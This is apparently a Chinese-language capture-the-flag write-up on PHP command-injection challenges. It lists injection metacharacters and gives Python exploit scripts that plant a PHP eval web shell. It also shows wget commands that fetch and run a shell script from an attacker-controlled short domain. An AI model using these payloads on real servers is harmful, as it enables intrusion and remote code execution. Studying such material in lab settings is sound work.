### 任意命令writeup
---------  
linux 上任意命令执行,一般会用到下面几个字符 
```bash 
  `   |   ||   &   &&   .   ;   -   <>   $    %0a 
```
###  [exec1](./exec1.php)

用 %0a 来执行命令,只能适用于linux , 127.0.0.1%0awhoami

---------
### [exec2](./exec2.php) 当可输入的字符不够长时,这里包含分割符一共可输入13个字符 

1. 最短的shell是  ```<?`$_GET[c]` ```; 一共十四个字符 
所以,直接写shell,长度肯定是不够的
所以思路是先写命令到一个文件中,然后用 sh filename  执行脚本,获取shell  

```python 
#!/usr/bin/python 
#conding: -*-utf-8-*-   

# exp.py    

import requests as req 

url = "http://localhost/ctf/exec2.php"
for i in "echo '<?php @eval($_POST[1]);?>' > shell.php ":
    data = {"ip":"0.0.0.0;echo -n \\"+i+">>1"}
    res = req.post(url,data=data)
    # print data['ip']
    # print res.text 
print "[*] bash shell upload successful!"

data={"ip":"0.0.0.0;bash 1"}
res=req.post(url,data=data)

shell="http://127.0.0.1/ctf/shell.php"

res=req.get(shell)
if  res.status_code == 200:
    print "[*] get shell successful"

```
获取shell在shell.php 

2.  第二种获得shell的方法  

前提是你需要有一个比较短的域名,然后在服务器的根目录下写一个302跳转 

```php
 // index.php 

 <?php header("Location: ./1.sh") ?>
```

```bash
#1.sh 
echo '<?php @eval($_POST[1]);?>' > shell.php 
```
这两个文件放在同一个目录下,执行

```bash
ip=0.0.0.0;wget i.com 
ip=0.0.0.0;sh index.html  #刚好21个字符
```
然后就获取一个shell  

-------
### [exec3](./exec3.php) 
这是7个字符get shell的题目,[writeup在这里](http://wonderkun.cc/index.html/?p=524)

下面只写一个python的poc吧
```python
#!/usr/bin/python
#-*- coding: utf-8 -*- 
import requests 
def GetShell():
    url = "http://192.168.56.129/shell.php?1="
    fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
    # linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"
    # 可以修改hosts文件，让a.cn指向一个自己的服务器。
    # 在a.cn 的根目录下创建index.html ，内容是一个php shell 
    for fileName in fileNames:
        createFileUrl = url+">"+fileName
        print createFileUrl 
        requests.get(createFileUrl)
    getShUrl = url + "ls -t>1"
    print getShUrl
    requests.get(getShUrl)
    getShellUrl = url + "sh 1"
    print getShellUrl
    requests.get(getShellUrl)
    shellUrl = "http://192.168.56.129/1.php"
    response = requests.get(shellUrl)
    if response.status_code == 200:
        print "[*] Get shell !"
    else :
        print "[*] fail!"
if __name__ == "__main__":
    GetShell()
    
```